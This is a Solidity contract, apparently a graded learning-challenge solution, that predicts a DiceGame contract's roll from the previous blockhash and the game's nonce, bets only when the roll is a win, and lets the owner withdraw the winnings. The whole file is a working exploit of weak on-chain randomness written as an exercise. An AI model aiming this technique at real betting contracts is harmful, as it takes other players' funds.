pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    function withdraw(address _addr, uint256 _amount) public payable onlyOwner {
        require(
            address(this).balance >= _amount,
            "There is no enough ETH on the contract"
        );
        (bool sent, ) = _addr.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function riggedRoll() public {
        require(
            address(this).balance >= .002 ether,
            "Not enough funds. At least 0.002 ethers are required"
        );
        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), nonce)
        );
        uint256 roll = uint256(hash) % 16;
        console.log(roll);

        require(roll <= 2, "Roll was greater than 2");
        diceGame.rollTheDice{value: 0.002 ether}();
    }

    receive() external payable {}
}
